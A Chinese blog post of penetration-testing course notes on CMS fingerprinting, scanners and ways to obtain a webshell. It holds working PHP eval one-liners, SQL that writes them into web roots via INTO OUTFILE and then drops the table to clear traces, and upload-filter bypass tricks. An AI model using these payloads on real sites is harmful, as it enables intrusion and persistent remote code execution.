<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>老男孩--内网渗透(5) | GoldY</title><meta name="author" content="GoldY"><meta name="copyright" content="GoldY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="老男孩网络安全第五部分，内网渗透讲解。">
<meta property="og:type" content="article">
<meta property="og:title" content="老男孩--内网渗透(5)">
<meta property="og:url" content="https://www.geekgold.xyz/posts/f254f946.html">
<meta property="og:site_name" content="GoldY">
<meta property="og:description" content="老男孩网络安全第五部分，内网渗透讲解。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.geekgold.xyz/img/oldboy.jpg">
<meta property="article:published_time" content="2025-05-12T10:55:16.000Z">
<meta property="article:modified_time" content="2025-05-13T12:33:24.413Z">
<meta property="article:author" content="GoldY">
<meta property="article:tag" content="网络安全">
<meta property="article:tag" content="老男孩安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.geekgold.xyz/img/oldboy.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "老男孩--内网渗透(5)",
  "url": "https://www.geekgold.xyz/posts/f254f946.html",
  "image": "https://www.geekgold.xyz/img/oldboy.jpg",
  "datePublished": "2025-05-12T10:55:16.000Z",
  "dateModified": "2025-05-13T12:33:24.413Z",
  "author": [
    {
      "@type": "Person",
      "name": "GoldY",
      "url": "https://www.geekgold.xyz/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.geekgold.xyz/posts/f254f946.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="bing-site-verification" content="E05CD8D6921B8F2AA32324DF2B267557"/><meta name="baidu-site-verification" content="codeva-tCktTl1n17"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '老男孩--内网渗透(5)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/bg2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 工具链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fa fa-cog"></i><span> 渗透工具</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/oldboy.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/logo.png" alt="Logo"><span class="site-name">GoldY</span></a><a class="nav-page-title" href="/"><span class="site-name">老男孩--内网渗透(5)</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-link"></i><span> 工具链接</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fa fa-cog"></i><span> 渗透工具</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">老男孩--内网渗透(5)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-12T10:55:16.000Z" title="发表于 2025-05-12 18:55:16">2025-05-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-13T12:33:24.413Z" title="更新于 2025-05-13 20:33:24">2025-05-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E8%80%81%E7%94%B7%E5%AD%A9%E5%AE%89%E5%85%A8/">老男孩安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">13.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>49分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="获取webshell方法总结"><a href="#获取webshell方法总结" class="headerlink" title="获取webshell方法总结"></a>获取webshell方法总结</h1><h2 id="CMS获取webshell"><a href="#CMS获取webshell" class="headerlink" title="CMS获取webshell"></a>CMS获取webshell</h2><p>什么是CMS</p>
<p>​	CMS系统指的是内容管理系统。已经有别人开发好了整个网站的前后端，使用者只需要部署cms，然后通过后台添加数据，修改图片等工作，就能搭建好一个的WEB系统。</p>
<p>如何搜寻CMS信息</p>
<p>​	常见方法：[信息收集-CMS识别-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=%E5%88%B0%E6%82%A8%E8%A6%81%E6%A3%80%E6%9F%A5%E7%9A%84%E7%BD%91%E7%AB%99--%3E%E6%8C%89">https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=到您要检查的网站--&gt;按</a> Ctrl %2B U 显示页面代码—&gt;在 html 页面上找到前缀为meta name%3D”generator”content%3D的标签—&gt;引擎名称将在“内容”一词后用引号表示,js 文件路径的行中。 例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持)</p>
<h3 id="在线信息收集网站"><a href="#在线信息收集网站" class="headerlink" title="在线信息收集网站"></a>在线信息收集网站</h3><p>国内<br><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a>        #识别CMS插件</p>
<p><a target="_blank" rel="noopener" href="https://www.yunsee.cn/">https://www.yunsee.cn</a>                    #云悉CMS识别</p>
<p><a target="_blank" rel="noopener" href="http://finger.tidesec.net/">http://finger.tidesec.net</a>                   #潮汐指纹识别</p>
<p><a target="_blank" rel="noopener" href="https://www.godeye.vip/">https://www.godeye.vip</a>                  #WEB指纹识别</p>
<p>1.2：国外<br><a target="_blank" rel="noopener" href="http://itrack.ru/whatcms">http://itrack.ru/whatcms</a>                 #CMS识别国外 （俄罗斯）</p>
<p><a target="_blank" rel="noopener" href="https://builtwith.com/">https://builtwith.com</a>                      #全面的 CMS 检测</p>
<p><a target="_blank" rel="noopener" href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com</a>      #网站CMS识别</p>
<p><a target="_blank" rel="noopener" href="https://cmsdetect.com/">https://cmsdetect.com</a>                  #CMS识别</p>
<p><a target="_blank" rel="noopener" href="https://rescan.io/">https://rescan.io</a>                            #CMS列表识别</p>
<p><a target="_blank" rel="noopener" href="https://scanwp.net/">https://scanwp.net</a>                        #包括插件也监测</p>
<p><a target="_blank" rel="noopener" href="https://www.isitwp.com/">https://www.isitwp.com</a>                #专注WordPress识别</p>
<p><a target="_blank" rel="noopener" href="https://www.codeinwp.com/find-out-what-wordpress-theme-is-that">https://www.codeinwp.com/find-out-what-wordpress-theme-is-that</a></p>
<h3 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h3><p>御剑WEB指纹识别</p>
<p>相关链接：<a target="_blank" rel="noopener" href="http://www.xitongzhijia.net/soft/171203.html">http://www.xitongzhijia.net/soft/171203.html</a>  （文件自测）</p>
<p>TideFinger（潮汐）</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p>
<p>安装教程：<br>git clone <a target="_blank" rel="noopener" href="https://github.com/TideSec/TideFinger.git">https://github.com/TideSec/TideFinger.git</a><br>cd TideFinger&#x2F;cd python3&#x2F; &amp;&amp; pip3 install -r requirements.txt  -i <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p>
<p>使用说明：<br>python3 TideFinger.py -u <a target="_blank" rel="noopener" href="http://www.123.com/">http://www.123.com</a> [-p 1] [-m 50] [-t 5] [-d 0]<br>   -u: 待检测目标URL地址<br>   -p:指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80<br>   -m: 指纹匹配的线程数，不指定时默认为50<br>   -t: 网站响应超时时间，默认为5秒<br>   -d: 是否启用目录匹配式指纹探测（会对目标站点发起大量请求），0为不启用，1为启用，默认为不启用</p>
<p>WhatWeb（kali自带）</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/WhatWeb.git">https://github.com/urbanadventurer/WhatWeb.git</a></p>
<p>安装教程：<br>cd WhatWeb &amp;&amp; apt install ruby-bundler &amp;&amp;  bundle install &amp;&amp;</p>
<p>使用说明：<br>whatweb <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></p>
<p>大宝剑</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/wgpsec/DBJ">https://github.com/wgpsec/DBJ</a></p>
<p>多CMS识别工具<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p>
<h3 id="其他识别CMS方法"><a href="#其他识别CMS方法" class="headerlink" title="其他识别CMS方法"></a>其他识别CMS方法</h3><p><strong>CMS识别指纹(浏览器插件)</strong><br>WhatRuns</p>
<p>Wappalyzer</p>
<p><strong>F12代码JS文件</strong><br>    如果有不知道CMS的网站，可以F12查看网站源代码的JS、CSS等文件，找特殊字符，然后去Github或者红迪（Reddit）网去搜索找到的字符。</p>
<p><strong>CMS的名称在页面的源代码中指定</strong><br>    到您要检查的网站–&gt;按 Ctrl + U 显示页面代码—&gt;在 html 页面上找到前缀为meta name&#x3D;”generator”content&#x3D;的标签—&gt;引擎名称将在“内容”一词后用引号表示</p>
<p><strong>文件路径</strong><br>    CMS 可以通过代码的典型文件夹及其结构来识别。特别是在指示 js 文件路径的行中。例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持</p>
<p><strong>网站页脚中的指示</strong><br>    CMS 名称有时可以在页脚、底部的小字体、联系信息或额外的公司信息下找到</p>
<p><strong>链接结构分析</strong><br>    如果网站页面的 URL 是在没有使用 CNC 生成器的情况下形成的，您会注意到页面文本中特定于特定 CMS 的部分。</p>
<p>WordPress 和 Joomla 的特定信息的链接可以在下面的示例中看到</p>
<p>WordPress：website_name&#x2F;р&#x3D;123</p>
<p>Joomla：website_name&#x2F;index.php?option&#x3D;com_content&amp;</p>
<p>task&#x3D;view&amp;id&#x3D;12&amp;Itemid&#x3D;345website_name&#x2F;content&#x2F;view&#x2F;12&#x2F;345&#x2F;</p>
<p><strong>管理员登录网址</strong><br>    上使用的 CMS 可以通过查看指向网站管理面板的 URL 来确定。这是 WordPress，例如，如果将 &#x2F;wp-admin&#x2F; 添加到 URL 栏中的域名，则会将您带到带有登录名和密码输入窗口的页面。</p>
<p>site_name&#x2F;wp-admin&#x2F; - WordPress</p>
<p>site_name&#x2F;administrator&#x2F; - Joomla</p>
<p>site_name&#x2F;admin&#x2F; - OpenCart</p>
<p>SiteName&#x2F;user&#x2F; - Drupal</p>
<p><strong>网站特有文件</strong><br>    如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css—dedecms</p>
<p><strong>网站MD5指纹</strong><br>    一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p>
<p><strong>一些汇总</strong><br>    网站文件命名规则</p>
<p>​	返回头的关键字</p>
<p>​	网页关键字</p>
<p>​	Url特征</p>
<p>​	Meta特征</p>
<p>​	Script特征</p>
<p>​	robots.txt</p>
<p>​	网站路径特征</p>
<h3 id="CMS漏洞检测工具"><a href="#CMS漏洞检测工具" class="headerlink" title="CMS漏洞检测工具"></a>CMS漏洞检测工具</h3><p><strong>wordpress</strong><br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/n00py/WPForce">https://github.com/n00py/WPForce</a></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p>
<p>描述 ：WPScan WordPress 安全扫描器</p>
<p>使用：kali–&gt;wpscan –url “目标网站”</p>
<p><strong>Drupal</strong><br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/SamJoan/droopescan">https://github.com/SamJoan/droopescan</a><br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/immunIT/drupwn">https://github.com/immunIT/drupwn</a></p>
<p>安装教程：<br>git clone <a target="_blank" rel="noopener" href="https://github.com/immunIT/drupwn.git">https://github.com/immunIT/drupwn.git</a> &amp;&amp; cd drupwn<br>pip3 install -r requirements.txt </p>
<p>使用说明：.&#x2F;drupwn –mode enum –target “目标地址”<br>  –mode MODE     模式枚举|利用<br>  –target TARGET   要扫描的目标主机名</p>
<p><strong>Joomla</strong><br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/OWASP/joomscan">https://github.com/OWASP/joomscan</a></p>
<p>描述：OWASP Joomla 漏洞扫描程序项目</p>
<p>安装教程：kali–&gt;apt install joomscan</p>
<p>使用：joomscan -u “目标”</p>
<p><strong>cmseek</strong><br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p>
<p>安装教程：</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> &amp;&amp; cd CMSeeK</p>
<p>pip3 install -r requirements.txt</p>
<p>使用说明：python3 cmseek.py -u “目标地址”  </p>
<p>#######以上三款工具都可kali安装#########</p>
<p><strong>几个在线CMS漏洞扫描网站</strong><br><a target="_blank" rel="noopener" href="https://wpsec.com/">https://wpsec.com/</a>                                                          #wordpress专业扫描</p>
<p><a target="_blank" rel="noopener" href="https://wpscan.com/">https://wpscan.com/</a>                                                        #wordpress专业扫描</p>
<p><a target="_blank" rel="noopener" href="https://www.malcare.com/wordpress-malware-scan/">https://www.malcare.com/wordpress-malware-scan/</a>     #wordpress专业扫描</p>
<p><a target="_blank" rel="noopener" href="https://hackertarget.com/scan-membership/">https://hackertarget.com/scan-membership/</a>                 #通用-收费</p>
<p><a target="_blank" rel="noopener" href="https://gf.dev/">https://gf.dev/</a>                                                                  #综合测试</p>
<p><a target="_blank" rel="noopener" href="https://pentest-tools.com/">https://pentest-tools.com/</a>                                              #2次免费扫描</p>
<p><a target="_blank" rel="noopener" href="https://www.automox.com/">https://www.automox.com/</a>        </p>
<p>相关参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/355150689">https://zhuanlan.zhihu.com/p/355150689</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/402320861">https://zhuanlan.zhihu.com/p/402320861</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/qingchengzi/articles/13533704.html">https://www.cnblogs.com/qingchengzi/articles/13533704.html</a></p>
<h2 id="非CMS获取webshell"><a href="#非CMS获取webshell" class="headerlink" title="非CMS获取webshell"></a>非CMS获取webshell</h2><p>更多的时候企业并不使用开源的CMS，而是选择自己开发源代码，这里的思路分为有权限和无权限两方面来分析</p>
<h3 id="有管理权限的情况："><a href="#有管理权限的情况：" class="headerlink" title="有管理权限的情况："></a>有管理权限的情况：</h3><p>是指前期通过其他方法，已经破解了管理后台功能，可以使用管理后台的情况</p>
<h4 id="通过正常上传一句话小马获取webshell"><a href="#通过正常上传一句话小马获取webshell" class="headerlink" title="通过正常上传一句话小马获取webshell"></a><strong>通过正常上传一句话小马获取webshell</strong></h4><ol>
<li>检查网站是否过滤上传文件后缀格式，如果未过滤直接上传一句话小马即可。</li>
<li>找到网站默认配置，将一句话小马插入配置中<br>因为有些网站没有对配置参数进行过滤，所以配置中的小马被读取后，就可能被连接</li>
</ol>
<p>建议先下载该站源码，进行查看源码过滤规则，以防插马失败。<br>插马失败很有可能会导致网站被你的小马中没有闭合标签导致网站出错。注意要闭合原有的代码，保证语法正确，以免程序运行出错。</p>
<h4 id="利用后台数据库备份获取webshell"><a href="#利用后台数据库备份获取webshell" class="headerlink" title="利用后台数据库备份获取webshell"></a><strong>利用后台数据库备份获取webshell</strong></h4><p>一般网站都不允许上传脚本类型文件，如 asp、php、jsp、aspx等文件。但一般后台都会有数据库备份功能。步骤如下</p>
<ol>
<li>上传允许格式的小马(如图片马)</li>
<li>找到文件上传后的文件路径</li>
<li>通过数据库备份，指定备份源文件与与备份后格式。</li>
</ol>
<p>如果后台限制了备份路径，可以尝试F12修改文本框元素</p>
<h4 id="通过花样上传一句话小马获取Webshell"><a href="#通过花样上传一句话小马获取Webshell" class="headerlink" title="通过花样上传一句话小马获取Webshell"></a>通过花样上传一句话小马获取Webshell</h4><p>使用BurpSuite 工具，%00截断、特殊名文件名绕过、文件名大小写绕过、黑白名单绕过等等，想尽一切办法就是要上传一句话木马，通过各种变形，万变不离其宗，换汤不换药。</p>
<h4 id="通过编辑模块、标签等拿WebShell"><a href="#通过编辑模块、标签等拿WebShell" class="headerlink" title="通过编辑模块、标签等拿WebShell"></a>通过编辑模块、标签等拿WebShell</h4><p>①通过对网站的<strong>模块</strong>进行编辑写入一句话，然后生成脚本文件拿WebShell</p>
<p>②通过将木马添加到压缩文件，把名字改为<strong>网站模板类型</strong>，上传到网站服务器，拿WebShell</p>
<h4 id="SQL命令获取"><a href="#SQL命令获取" class="headerlink" title="SQL命令获取"></a>SQL命令获取</h4><p>有一定的数据库权限的情况下，通过向数据库表写入马，然后备份该表为脚本文件的方式进行<br><strong>大致步骤：</strong></p>
<ol>
<li>创建表</li>
<li>将一句话写入刚创建的表中</li>
<li>查询一句话所在表到文件，成功将一句话写入文件</li>
</ol>
<p>第一种方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`best` (`best1` TEXT NOT NULL );  </span><br><span class="line">#将一句话木马插入到mysql库best表best1字段</span><br><span class="line">INSERT INTO `mysql`.`best` (`best1` ) VALUES (&#x27;&lt;?php @eval($_POST[password]);?&gt;&#x27;);</span><br><span class="line">#查询这个字段导出到网站的文件中</span><br><span class="line">SELECT `best1` FROM `best` INTO OUTFILE &#x27;d:/wamp/www/best.php&#x27;;</span><br><span class="line">#把痕迹清除</span><br><span class="line">DROP TABLE IF EXISTS `best`;</span><br></pre></td></tr></table></figure>

<p>第二种方法：<br>优先推荐，简单明了，且避免了误删别人的数据！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接将查询出来的语句写入文件</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;INTO OUTFILE &#x27;d:/wamp/www/best3.php&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="利用解析漏洞拿WebShell"><a href="#利用解析漏洞拿WebShell" class="headerlink" title="利用解析漏洞拿WebShell"></a>利用解析漏洞拿WebShell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）IIS5.x / 6.0 解析漏洞</span><br><span class="line">2）IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞</span><br><span class="line">3）Nginx &lt; 8.03 空字节代码执行漏洞</span><br><span class="line">4）Apache 解析漏洞</span><br></pre></td></tr></table></figure>

<p>其他的还有命令执行漏洞，反序列化漏洞等</p>
<h4 id="利用编辑器漏洞拿WebShell"><a href="#利用编辑器漏洞拿WebShell" class="headerlink" title="利用编辑器漏洞拿WebShell"></a>利用编辑器漏洞拿WebShell</h4><p>利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。</p>
<h4 id="文件包含拿WebShell"><a href="#文件包含拿WebShell" class="headerlink" title="文件包含拿WebShell"></a>文件包含拿WebShell</h4><ol>
<li>首先需要存在文件包含漏洞</li>
<li>先将WebShell 改为txt格式文件上传</li>
<li>然后上传一个脚本文件包含该txt格式文件</li>
<li>通过这种方式，可绕过WAF拿WebShell</li>
</ol>
<h4 id="上传其它脚本类型拿WebShell"><a href="#上传其它脚本类型拿WebShell" class="headerlink" title="上传其它脚本类型拿WebShell"></a>上传其它脚本类型拿WebShell</h4><ol>
<li>此类型用于一台服务器具有多个网站<br>a网站是asp的站，b可能是php的站，分别限制了asp和php文件的上传，可以尝试向A上传php的脚本，来拿Shell</li>
<li>也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.”， 来突破文件类型限制进行上传拿WebShell</li>
</ol>
<h4 id="修改网站上传类型配置来拿WebShell"><a href="#修改网站上传类型配置来拿WebShell" class="headerlink" title="修改网站上传类型配置来拿WebShell"></a>修改网站上传类型配置来拿WebShell</h4><p>某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p>
<h3 id="非管理权限"><a href="#非管理权限" class="headerlink" title="非管理权限"></a>非管理权限</h3><hr>
<h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</p>
<p>①可以通过log 备份、差异备份拿WebShell<br>②可以通过<code>into outfile</code>,<code>into outfile</code>函数(写入函数)将一句话木马写入，拿WebShell。<br>③利用phpmyadmin 将木马导出，拿WebShell<br>④利用连接外连的数据库拿WebShell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 要有file_priv权限</span><br><span class="line">2. 知道文件绝对路径 </span><br><span class="line">3. 能使用union </span><br><span class="line">4. 对web目录有读权限</span><br><span class="line">5. 若过滤了单引号，则可以将函数中的字符进行hex编码 </span><br></pre></td></tr></table></figure>

<h4 id="xss和sql注入联合利用"><a href="#xss和sql注入联合利用" class="headerlink" title="xss和sql注入联合利用"></a>xss和sql注入联合利用</h4><p>有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<code>&lt;?php @eval($_POST[&#39;CE&#39;]);?&gt;</code>，之后再用数据库注入，查询到文件into file成功插入一句话木马</p>
<h4 id="IIS写权限拿WebShell"><a href="#IIS写权限拿WebShell" class="headerlink" title="IIS写权限拿WebShell"></a>IIS写权限拿WebShell</h4><p>有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，已经很少见了，有专门的利用工具（桂林老兵）。<br>原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p>
